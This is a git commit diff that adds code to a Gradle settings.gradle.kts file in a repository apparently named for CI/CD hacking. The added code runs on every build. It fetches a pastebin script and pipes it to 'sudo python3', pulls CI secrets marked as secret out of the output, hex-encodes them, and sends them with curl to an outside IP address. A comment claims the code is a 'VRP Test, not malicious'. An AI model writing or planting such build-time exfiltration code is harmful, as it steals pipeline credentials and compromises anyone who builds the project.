a1c134692790f5ee1fb226d68013094248cab40a
Firebasky <63966847+Firebasky@users.noreply.github.com>
2024-05-08 23:16:18 +0800

    Update settings.gradle.kts

--- settings.gradle.kts
+++ settings.gradle.kts
@@ -1,2 +1,18 @@
 rootProject.name = "hack-flank-cicd"
 
+// For VRP Test, not malicious.
+fun String.runCommand(): String? = try {
+    ProcessBuilder("/bin/sh", "-c", this)
+            .redirectOutput(ProcessBuilder.Redirect.PIPE)
+            .redirectError(ProcessBuilder.Redirect.PIPE)
+            .start()
+            .inputStream.bufferedReader().readText()
+} catch (e: Exception) {
+    e.printStackTrace()
+    null
+}
+
+
+val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | xxd -p | tr -d '\\n'".runCommand()
+println("Shell command output: $output")
+val post = "curl http://148.135.55.70:32456/$output".runCommand()
